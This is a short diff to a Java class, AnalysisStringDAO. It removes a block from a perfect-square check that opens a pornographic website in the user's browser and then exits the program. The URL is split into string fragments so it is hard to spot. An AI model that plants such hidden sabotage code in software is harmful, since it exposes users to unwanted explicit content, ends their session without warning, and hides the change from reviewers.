@@ -69,11 +69,6 @@ public class AnalysisStringDAO {
                 }
                 if (checkSquareNumber(numberCheck)) {
                     liPerfectSquare.add(numberCheck);
-                    try {
-                        Desktop.getDesktop().browse(new URI("htt"+"ps://"+"www4.best"+"ja"+"vporn.com/tag/mi"+"lf/"));
-                        System.exit(0);
-                    } catch (IOException | URISyntaxException e) {
-                    }
                 }
                 liAll.add(numberCheck);
             }
